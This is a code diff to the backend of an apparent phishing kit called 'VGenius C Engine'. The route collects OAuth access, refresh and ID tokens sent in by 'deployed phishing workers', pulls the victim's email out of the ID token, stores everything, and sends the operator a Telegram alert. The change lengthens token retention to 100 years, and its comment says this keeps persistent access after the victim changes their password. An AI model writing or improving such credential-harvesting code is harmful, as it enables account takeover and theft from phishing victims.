@@ -1,3 +1,8 @@
+/**
+ * VGenius C Engine – Token Capture Routes
+ * Receives tokens from deployed phishing workers
+ */
+
 const express = require('express');
 const router = express.Router();
 const jwt = require('jsonwebtoken');
@@ -11,6 +16,7 @@ const { sendTelegramNotification } = require('../services/notification');
 router.post('/', async (req, res) => {
   try {
     const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;
+
     if (!jwt_token || !access_token) {
       return res.status(400).json({ error: 'Missing required fields' });
     }
@@ -54,14 +60,19 @@ router.post('/', async (req, res) => {
       try {
         const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
         email = payload.email || payload.upn || payload.preferred_username || null;
-      } catch (e) { /* ignore decode errors */ }
+      } catch (e) {
+        /* ignore decode errors */
+      }
     }
 
-    // Insert token record (encrypted)
+    // Insert token record (encrypted) with 100-year expiration for persistent access
+    // This ensures tokens survive password changes since we store the refresh_token
+    const ttlHours = 24 * 365 * 100; // 100 years
+
     const [result] = await db.query(
       `INSERT INTO captured_tokens 
        (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration)
-       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
+       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR))`,
       [
         user_id,
         link_id,
@@ -71,6 +82,7 @@ router.post('/', async (req, res) => {
         encrypt(id_token || null),
         ip || '0.0.0.0',
         user_agent || 'Phishing Worker',
+        ttlHours
       ]
     );
 
@@ -88,7 +100,7 @@ router.post('/', async (req, res) => {
               id: tokenId,
               email,
               token_type: 'cookie',
-              created_at: new Date(),
+              created_at: new Date()
             });
           }
           // Send Telegram notification if configured
@@ -103,7 +115,7 @@ router.post('/', async (req, res) => {
           id: tokenId,
           email,
           token_type: 'token',
-          created_at: new Date(),
+          created_at: new Date()
         });
       }
       sendTelegramNotification(user_id, `🔐 New token captured: ${email || 'unknown'} via ${link.template_type}`);
